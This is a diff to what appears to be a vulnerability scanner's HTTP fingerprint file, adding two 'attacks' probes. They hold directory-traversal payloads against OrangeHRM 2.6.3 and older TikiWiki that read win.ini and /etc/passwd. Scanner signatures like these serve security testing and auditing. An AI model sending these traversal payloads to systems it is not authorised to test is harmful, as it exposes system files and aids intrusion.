@@ -2702,6 +2702,26 @@ table.insert(fingerprints, {
                  {match='200', output='Cute Editor ASP.NET Remote File Disclosure ( CVE 2009-4665 )'}
         }
 })
+
+table.insert(fingerprints, {
+ category='attacks',
+        probes={
+         {path='/plugins/PluginController.php?path=..%2f..%2f..%2f..%2f..%2f..%2f..%2f..%2fwindows%2fwin.ini%00', method='GET'}
+ },
+        matches={
+                 {match='200', output='OrangeHRM 2.6.3 Local File Inclusion '}
+        }
+})
+
+table.insert(fingerprints, {
+ category='attacks',
+        probes={
+         {path='/tiki-listmovies.php?movie=../../../../../../etc/passwd%001234', method='GET'}
+ },
+        matches={
+                 {match='200', output='TikiWiki < 1.9.9 Directory Traversal Vulnerability'}
+        }
+})
 ------------------------------------------------
 ----        Open Source CMS checks          ----
 ------------------------------------------------
